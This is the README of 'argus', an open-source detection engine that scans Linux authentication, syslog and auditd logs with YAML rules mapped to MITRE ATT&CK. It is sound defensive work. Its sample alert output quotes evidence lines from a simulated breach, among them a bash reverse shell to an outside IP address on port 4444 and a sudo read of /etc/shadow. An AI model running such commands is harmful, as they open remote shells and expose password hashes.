# argus

![argus](docs/banner.svg)

[![CI](https://github.com/dev-rudran/argus-detect/actions/workflows/ci.yml/badge.svg)](https://github.com/dev-rudran/argus-detect/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

`argus` is a streaming detection engine for Linux authentication, syslog,
JSON-lines and auditd logs. It ships a curated rule pack, a small rule
language, stateful correlation, MITRE ATT&CK mapping and standalone reports.

The engine is deliberately boring in the best way: one runtime dependency
(PyYAML), no network access, no database, no agent, and deterministic output
that can be reviewed in a pull request.

## Why this exists

Most Linux detection content is bundled inside a SIEM. That makes it hard to
test a rule, review a change, or run the same logic against a packet capture of
logs from an incident. `argus` keeps the detection logic in versioned YAML and
runs it from a single command:

```console
$ argus scan /var/log/auth.log --fail-on high
```

The project is also a reference implementation for detection engineering:
every bundled rule has a description, severity, documented false positives and
ATT&CK tags, and the test suite exercises the parsers, correlation engine and
report writers.

## Highlights

- Streaming ingest: files are read line by line, directories are walked
  recursively, and malformed lines are counted instead of aborting the scan.
- Four input formats with automatic detection: OpenSSH auth logs, RFC 3164 and
  RFC 5424 syslog, JSON-lines, and Linux auditd records.
- 36 bundled rules across 48 ATT&CK techniques, with sliding-window
  thresholds, distinct-value thresholds and two-stage sequences.
- Console, JSON-lines, Markdown and fully standalone HTML reports.
- Rule tooling: `list`, `show`, `lint` and `validate`, plus `explain` for the
  compiled semantics of a rule and `attack-matrix` for coverage.
- Suppression windows that are useful during tuning without deleting the rule.
- Deterministic exit codes for CI and cron jobs.

## Installation

Python 3.10 or newer is required.

```console
git clone https://github.com/dev-rudran/argus-detect.git
cd argus-detect
python -m venv .venv
. .venv/bin/activate
pip install .
```

The console entry point is `argus`; the module form `python -m argus` is
equivalent. For a development checkout use `pip install -e ".[dev]"`.

## Quick start

The repository contains a benign corpus and a deliberately compromised host
under `examples/logs/`.

### A clean host produces no medium-or-higher alerts

```console
$ argus scan examples/logs/benign --min-severity medium --stats --year 2026
argus 0.1.0  detection report
rules 36  |  events 88  |  files 3  |  malformed 0
window 2026-11-03 03:00:01 .. 2026-11-06 17:30:11 UTC

No alerts at or above medium.
Summary
  no alerts

Ingest
  files 3   lines 88   events 88   malformed 0
  filtered 0   skipped files 0   truncated 0
  elapsed 0.009s   9,379 events/s
  log types: jsonl 29, sshd 35, syslog 24
```

Timing and throughput vary by machine; the event, file and alert counts are
deterministic for this corpus.

### A compromised host produces the expected critical findings

```console
$ argus scan examples/logs/attack --min-severity critical --year 2026
argus 0.1.0  detection report
rules 36  |  events 108  |  files 5  |  malformed 0
window 2026-11-10 01:50:00 .. 2026-11-10 03:55:01 UTC

CRITICAL  ARGUS-0004  SSH login succeeds after repeated failures
  group: src_ip=91.240.118.172   logsource: linux/sshd
  first seen: 2026-11-10 02:20:20   last seen: 2026-11-10 02:30:14   count: 4
  ATT&CK: T1078 Valid Accounts; T1110.001 Password Guessing; T1021 Remote Services; T1021.004 SSH
  evidence (4 of 4 matched events):
    2026-11-10 02:20:20  sshd    Failed password for root from 91.240.118.172 port 40224 ssh2  [examples/logs/attack/auth.log:16]
    2026-11-10 02:20:30  sshd    Failed password for root from 91.240.118.172 port 40226 ssh2  [examples/logs/attack/auth.log:17]
    2026-11-10 02:20:40  sshd    Failed password for root from 91.240.118.172 port 40228 ssh2  [examples/logs/attack/auth.log:18]
    2026-11-10 02:30:14  sshd    Accepted password for deploy from 91.240.118.172 port 44322 ssh2  [examples/logs/attack/auth.log:27]

CRITICAL  ARGUS-0018  Shadow password file accessed
  group: host=web01   logsource: linux/auditd
  first seen: 2026-11-10 03:05:00   last seen: 2026-11-10 03:05:33   count: 2
  ATT&CK: T1003 OS Credential Dumping; T1552.001 Credentials In Files
  evidence (2 of 2 matched events):
    2026-11-10 03:05:00  auditd  item=0 name="/etc/shadow" inode=1832 dev=fd:01 mode=0100640 ouid=0 ogid=42 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0  [examples/logs/attack/audit.log:2]
    2026-11-10 03:05:33  sshd    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow  [examples/logs/attack/auth.log:45]

CRITICAL  ARGUS-0020  Reverse shell command executed
  group: user=deploy   logsource: linux/auth
  first seen: 2026-11-10 03:10:28   last seen: 2026-11-10 03:10:28   count: 1
  ATT&CK: T1059 Command and Scripting Interpreter; T1059.004 Unix Shell
  evidence (1 of 1 matched events):
    2026-11-10 03:10:28  sshd    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1'  [examples/logs/attack/auth.log:50]

Summary
  critical 3
  top rules:
    ARGUS-0004  SSH login succeeds after repeated failures  x1
    ARGUS-0018  Shadow password file accessed  x1
    ARGUS-0020  Reverse shell command executed  x1
  hosts:
    web01  x3
```

A full scan of the same corpus emits 43 alerts and exercises all 36 rules.
The scenario is documented in [examples/scenario-breach.md](examples/scenario-breach.md).

## Commands

```console
argus scan PATH [PATH ...] [options]   scan files or directories
argus rules list                       list the loaded rules
argus rules show ARGUS-0001            print a rule as YAML plus compiled notes
argus rules lint                       schema and semantic checks
argus rules validate                   fail if any rule has an error
argus explain ARGUS-0004               explain selections, correlation and ATT&CK
argus attack-matrix                    show ATT&CK coverage as text
argus attack-matrix --format html      write a standalone coverage matrix
argus version                          print the version
```

### Scan options

| Option | Description |
|---|---|
| `--rules DIR` | Use a custom rule directory instead of the bundled pack. |
| `--format {console,jsonl,md,html}` | Report format. Default: `console`. |
| `-o, --output FILE` | Write to a file instead of stdout. Parent directories are created. |
| `--min-severity LEVEL` | Hide alerts below `informational`, `low`, `medium`, `high` or `critical`. |
| `--since`, `--until` | UTC date or timestamp bounds. A date covers the whole UTC day. |
| `--fail-on LEVEL` | Exit 1 when an alert at or above the level is present. |
| `--stats` | Print ingest, throughput and suppression counters. |
| `--suppress RULE:GROUP:DURATION` | Add a suppression window; repeatable and glob-aware. |
| `--suppress-file FILE` | Load suppression entries from YAML. |
| `--year YEAR` | Starting year for yearless syslog timestamps. |
| `--type {auto,sshd,syslog,jsonl,auditd}` | Force a parser. Default: automatic detection. |
| `--sample-events N` | Maximum evidence events retained per alert. Default: 12. |
| `--no-color` | Disable ANSI colour on a terminal. `NO_COLOR` is also honoured. |

### Reports

```console
argus scan logs --format jsonl -o report.jsonl
argus scan logs --format md    -o report.md
argus scan logs --format html  -o report.html
argus attack-matrix --format html -o attack.html
```

The HTML report is a single file with inline CSS and JavaScript. It loads no
CDN assets, webfonts or external images, and escaped log content is rendered as
text. The JSON-lines report contains one alert object per line; scan metadata is
carried by the Markdown and HTML reports.

### Exit codes

| Code | Meaning |
|---:|---|
| `0` | The scan completed and no alert met the `--fail-on` threshold. |
| `1` | A scan completed and at least one alert met `--fail-on`, or rule lint found errors. |
| `2` | Invalid arguments, an unreadable input, a bad rule, or a suppression error. |

For example:

```console
$ argus scan examples/logs/attack --fail-on high --year 2026 > /dev/null
$ echo $?
1
$ argus scan /nonexistent
argus: error: input path does not exist: /nonexistent
$ echo $?
2
```

## Input formats

Detection is automatic, based on file names and the first lines of each file.
Use `--type` when a file has an ambiguous name. All parsers normalise fields so
that one rule can match across formats.

| Parser | What it reads |
|---|---|
| `sshd` | OpenSSH auth.log records plus the sudo, su, cron, systemd, useradd and kernel lines that share the file. |
| `syslog` | RFC 3164 and RFC 5424 records, including authentication, firewall, kernel, systemd and audit messages. |
| `jsonl` | One JSON object per line. Nested keys are flattened to dotted names, and common ECS-style aliases are normalised. |
| `auditd` | `type=... msg=audit(...)` records, including `EXECVE`, `SYSCALL`, `USER_CMD` and `DAEMON` events. |

Timestamps may be ISO-8601, RFC 3164, RFC 5424 or Unix epoch. Syslog lines
without a year use `--year` when supplied; otherwise the current year is
inferred with rollover handling for a file that crosses a year boundary.

## Rule format

Rules are YAML and follow a Sigma-inspired schema. A threshold rule from the
bundled pack:

```yaml
id: ARGUS-0001
title: SSH brute force from a single source
description: >
  Multiple failed SSH authentication attempts from one source address within a
  short window. This catches password guessing and scripted credential attacks
  against a host.
severity: high
logsource:
  product: linux
  service: sshd
detection:
  selection:
    action: ssh_auth_failed
  condition: selection
timeframe: 2m
group_by: [src_ip]
threshold:
  count: 6
  op: gte
tags:
  - attack.credential_access
  - attack.t1110
  - attack.t1110.001
falsepositives:
  - A user repeatedly mistyping a password, especially without key-based login.
  - Automated deployment or monitoring clients with stale credentials.
  - A NAT gateway where many users share one public address.
```

Selections combine field matchers; `condition` combines selections with `and`,
`or`, `not`, parentheses and `any of`/`all of` selectors. Supported modifiers
include `contains`, `startswith`, `endswith`, `re`, `cidr`, `gt`, `lt`, `gte`,
`lte`, `exists` and `in`. Matching is case-insensitive by default, and a bare
value containing `*` or `?` is treated as a glob.

Correlation is a documented extension to the Sigma schema:

- `threshold` with `count`, optional `op` and optional `distinct` fields.
- `timeframe` for the sliding window.
- `group_by` to keep state per source address, user, host or a tuple of fields.
- `sequence` for two-stage logic such as "at least three failures, then a
  success, within ten minutes".

The full schema, the condition grammar and the correlation semantics are in
[docs/WRITING_RULES.md](docs/WRITING_RULES.md). The bundled rules and their
ATT&CK mapping are listed in [docs/DETECTIONS.md](docs/DETECTIONS.md).

### Inspect and validate rules

```console
$ argus rules lint

36 rules checked, 0 error(s), 0 warning(s)
$ argus rules validate
36 rules valid
```

`rules lint` prints warnings as well as errors and exits 1 only for errors.
`rules validate` is the stricter CI gate: any error exits 1.

To explain a rule without opening the YAML:

```console
$ argus explain ARGUS-0004 --rules src/argus/rules
ARGUS-0004  SSH login succeeds after repeated failures
Severity:    critical
Logsource:   linux/sshd
Source:      src/argus/rules/0004-ssh-success-after-failures.yml
Description: A successful SSH authentication from an address that has just produced at least three failures. This is the decisive pivot from brute force or password spraying to an established session.

Detection
  failures: action=ssh_auth_failed
  success: action=ssh_auth_success
  condition: failures or success
  compiled:  (failures or success)
  sequence: 3 x failures -> success within 600s, group_by src_ip

ATT&CK
  T1078  Valid Accounts  [Defense Evasion, Persistence, Privilege Escalation, Initial Access]  https://attack.mitre.org/techniques/T1078
  T1110.001  Password Guessing  [Credential Access]  https://attack.mitre.org/techniques/T1110/001
  T1021  Remote Services  [Lateral Movement]  https://attack.mitre.org/techniques/T1021
  T1021.004  SSH  [Lateral Movement]  https://attack.mitre.org/techniques/T1021/004

False positives
  - A user who mistypes a password several times and then succeeds.
  - A service that rotates credentials and retries after failures.
  - An authorized penetration test replaying credential attacks.
```

## ATT&CK coverage

```console
$ argus attack-matrix
argus 0.1.0 ATT&CK coverage
36 rules cover 48/48 catalogued techniques (100.0%)

Initial Access (4/4)
  T1078      Valid Accounts                                   ARGUS-0004, ARGUS-0005
  T1195      Supply Chain Compromise                          ARGUS-0027
  T1195.002  Compromise Software Supply Chain                 ARGUS-0027
  T1200      Hardware Additions                               ARGUS-0030
...
```

Coverage is computed from `attack.t####` tags. Tactics are derived from a
built-in technique catalogue, so an unknown tactic or a malformed tag is a lint
error and an unknown technique is reported as a lint warning.

## Suppression

Suppression is useful when a known scanner or a migration job would otherwise
drown the report. A matching alert starts a rolling window; further matches are
dropped until the window expires.

```console
argus scan /var/log --suppress 'ARGUS-0001:src_ip=10.0.0.5:1h'
```

The group is matched against the alert's group key, so `*` wildcards are
allowed. The same policy can live in a file:

```yaml
suppressions:
  - rule: ARGUS-0001
    group: "src_ip=10.0.0.5"
    duration: 1h
  - rule: ARGUS-0024
    group: "*"
    duration: 30m
```

```console
argus scan /var/log --suppress-file suppressions.yml --stats
```

Suppressed alerts are counted in the scan statistics and in `--stats` output.
They are not silently forgotten.

## Development

```console
python -m venv .venv
. .venv/bin/activate
pip install -e ".[dev]"
make check
```

`make check` runs the same gates as CI:

```console
ruff check .
ruff format --check .
bandit -r src
pytest
```

The test suite covers timestamp and duration parsing, every matcher and
condition operator, rule loading and linting, all four parsers, streaming and
file discovery, correlation and suppression, ATT&CK coverage, all report
formats and the CLI exit-code contract.

## Project layout

```text
src/argus/
  cli.py             command line interface and exit codes
  engine.py          streaming engine, thresholds, sequences, suppression
  match.py           field matchers and modifiers
  models.py          Event, Alert, Rule and correlation models
  attack.py          ATT&CK catalogue and coverage
  ingest/            sshd, syslog, JSON-lines and auditd parsers
  report/            console, JSON-lines, Markdown and HTML writers
  rules/             36 bundled YAML rules, loader, condition parser
examples/logs/       benign and attack corpora
tests/               unit and integration tests
docs/                rule authoring, detection catalogue and banner
```

## Limitations

- `argus` is a batch scanner over files, not a long-running collector. Use
  `--since` with a scheduler, or feed it rotated files from a log shipper.
- Correlation state is in memory and scoped to one process. There is no
  distributed state or cross-host joining beyond the fields present in an
  event.
- The parsers target common Linux formats. Vendor-specific appliances need a
  JSON-lines shim or a custom parser.
- Rule matching is case-insensitive and does not expose a case-sensitive
  modifier.
- The bundled pack is a starting point, not a compliance certification. Tune
  thresholds against your own baseline and review the documented false
  positives.
- The HTML report contains the evidence lines you scanned. Treat it as
  sensitive incident data. Markdown reports keep evidence in fenced blocks;
  render them with a Markdown processor that sanitizes raw HTML.

## License

MIT. Copyright 2026 Rudra Tushir. See [LICENSE](LICENSE).
